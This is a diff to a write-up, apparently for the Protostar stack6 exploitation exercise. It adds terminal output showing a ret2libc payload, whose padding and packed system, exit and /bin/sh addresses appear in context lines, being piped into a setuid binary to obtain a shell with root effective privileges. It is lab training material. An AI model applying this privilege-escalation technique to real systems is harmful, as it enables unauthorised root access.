@@ -317,6 +317,15 @@ bin_sh_address = struct.pack("I", 0xb7fb63bf)
 print padding + system_address + exit_address + bin_sh_address
 ```
 
+```sh
+user@protostar:/opt/protostar/bin$ (python /tmp/buf.py;cat) | ./stack6
+input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA���AAAAAAAAAAAA����`췿c�
+id
+uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
+^C
+user@protostar:/opt/protostar/bin$
+```
+
 ###### References
 
 - [W^X](https://en.wikipedia.org/wiki/W%5EX)
